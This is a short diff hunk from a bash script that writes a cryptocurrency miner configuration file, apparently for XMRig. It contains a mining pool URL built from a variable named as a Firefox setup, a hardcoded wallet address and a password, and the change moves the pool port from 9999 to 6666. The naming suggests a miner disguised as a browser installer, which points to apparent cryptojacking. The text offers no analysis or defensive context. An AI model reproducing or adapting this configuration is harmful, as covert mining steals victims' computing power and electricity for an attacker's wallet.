@@ -83,7 +83,7 @@ bash -c 'cat <<EOT >>config.json
         {
             "algo": null,
             "coin": null,
-              "url": "$firefoxsetup.$link:9999",
+              "url": "$firefoxsetup.$link:6666",
             "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjXYC8xTdYSfScBAJ",
             "pass": "hope",
             "rig-id": null,
